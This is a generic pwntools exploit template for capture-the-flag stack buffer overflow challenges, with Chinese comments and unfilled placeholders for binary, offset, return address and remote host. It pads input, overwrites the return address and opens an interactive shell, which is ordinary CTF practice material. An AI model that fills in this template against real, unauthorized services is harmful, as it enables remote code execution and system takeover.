#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Basic PWN Template - Stack Buffer Overflow
Author: CTF Player
Date: {{date}}
Target: {{target}}
"""

from pwn import *

# 设置目标程序
binary = "./{{binary_name}}"
elf = ELF(binary)

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'  # 或 'i386'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("{{remote_host}}", {{remote_port}})
    else:
        p = process(binary)

    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')

    # Exploit 代码
    payload = b"A" * {{offset}}  # 填充到返回地址
    payload += p64({{return_address}})  # 覆盖返回地址

    # 发送payload
    p.sendline(payload)

    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
